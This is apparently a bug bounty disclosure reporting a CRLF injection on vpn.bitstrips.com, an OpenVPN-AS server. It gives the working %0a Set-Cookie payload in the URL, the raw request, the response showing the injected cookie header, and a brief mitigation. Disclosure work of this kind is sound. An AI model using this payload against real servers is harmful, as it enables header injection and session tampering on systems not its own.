Summary:

HI

I found that the site https://vpn.bitstrips.com/ is vulnerable to a CRLF Injection.
By injecting a Carriage Return and Line Feed character, we are able to make the server issue a set-cookie header.

GET Request :
```

https://vpn.bitstrips.com/__session_start__/%0aSet-Cookie:malicious_cookie1

Host: vpn.bitstrips.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0

Connection: keep-alive

```
Response:
```
HTTP/1.1 302 Found
Transfer-Encoding: chunked
Date: Tue, 06 Jun 2017 20:00:36 GMT
Content-Type: text/html; charset=UTF-8
Location: https://vpn.bitstrips.com/
Set-Cookie: malicious_cookie1
Server: OpenVPN-AS
```

As can be seen in the response, the server will issue a Set-Cookie header with an arbitrary value and that cookie will be set on the client.

To mitigate this issue, the application should strip out any input which contains the %0d%0a URL encoded characters.
